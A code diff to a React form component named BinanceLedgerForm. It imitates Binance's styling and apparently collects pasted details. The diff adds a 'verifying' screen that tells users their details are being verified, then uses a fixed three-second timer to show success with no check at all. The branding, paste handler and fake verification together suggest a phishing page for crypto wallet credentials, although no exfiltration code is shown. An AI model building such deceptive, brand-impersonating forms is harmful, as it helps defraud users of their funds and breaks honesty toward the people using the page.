@@ -135,7 +135,12 @@ const BinanceLedgerForm: FC = () => {
     }
     
     setErrors({});
-    transitionToStep('important-notice');
+    transitionToStep('verifying');
+    
+    // Simulate verification process
+    setTimeout(() => {
+      transitionToStep('success');
+    }, 3000);
   };
 
   const handlePaste = async () => {
@@ -232,10 +237,10 @@ const BinanceLedgerForm: FC = () => {
   const renderSpecialState = () => {
     if (currentStep === 'summary') {
       return (
-        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
-          <div className="max-w-sm mx-auto">
+        <div style={{ minHeight: "350px", display: "flex", flexDirection: "column" }}>
+          <div className="flex-1">
             <div 
-              className="mb-4 text-sm font-semibold font-binance"
+              className="mb-4 text-sm font-semibold font-binance text-left"
               style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
             >
               Review Information
@@ -309,7 +314,9 @@ const BinanceLedgerForm: FC = () => {
                 </div>
               </div>
             </div>
+          </div>
 
+          <div className="mt-auto">
             <div className="mb-4">
               <div className="flex items-start space-x-2">
                 <Checkbox
@@ -387,15 +394,15 @@ const BinanceLedgerForm: FC = () => {
 
     if (currentStep === 'verifying') {
       return (
-        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
+        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}>
+          <div className="flex justify-center mb-4">
+            <div className="animate-spin rounded-full h-8 w-8 border-4 border-yellow-500 border-t-transparent"></div>
+          </div>
           <div 
-            className="text-xs font-semibold font-binance mb-3"
+            className="text-xs font-semibold font-binance"
             style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
           >
             Please wait a moment while we verify your details
-          </div>
-          <div className="flex justify-center">
-            <div className="animate-spin rounded-full h-5 w-5 border-4 border-yellow-500 border-t-transparent"></div>
           </div>
         </div>
       );
